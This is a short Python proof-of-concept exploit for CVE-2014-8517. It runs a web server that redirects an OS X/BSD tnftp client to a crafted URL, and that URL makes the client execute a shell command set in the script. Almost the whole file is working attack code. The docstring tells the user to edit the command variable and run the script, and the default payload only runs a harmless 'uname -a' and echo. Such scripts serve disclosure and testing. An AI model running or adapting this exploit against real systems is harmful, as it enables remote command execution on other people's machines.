#!/usr/bin/env python

"""
Sample OSX/BSD FTP client exploit. Written because ISO policies were doing
my head in. To exploit, edit the value of the cmd variable, then run the
script. To test:
ftp http://<myserver>/foo
And you should see the command executed.
All wrongs reversed - @stevelord
CVE-2014-8517
这个漏洞可通过tnftp让ftp客户端执行恶意web服务器发来的命令。
"""

import BaseHTTPServer
import sys
import socket
import urllib

hostname = socket.getfqdn() # Set this to your IP if you have no FQDN
port = 8000 # Set this to the port you want to run this on
cmd = "uname -a; echo You probably shouldnt execute random code from the Internet. Just saying."

cmd = urllib.quote(cmd)
redir = "http://" + hostname + ":" + str(port) + "/cgi-bin/|" + cmd 

class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
	def do_GET(s):
		if cmd in s.path:
			s.send_response(200)
			s.end_headers()
		else:
			s.send_response(302)
			s.send_header("Location", redir)
			s.end_headers()

if __name__ == "__main__":
	print "redirecting to,", redir
	server_class = BaseHTTPServer.HTTPServer
	httpd = server_class((hostname, port), RedirectHandler)
	try:
		httpd.serve_forever()
		print "Started serving."
	except KeyboardInterrupt:
		pass
	httpd.server_close()
	print "\nStopped serving."
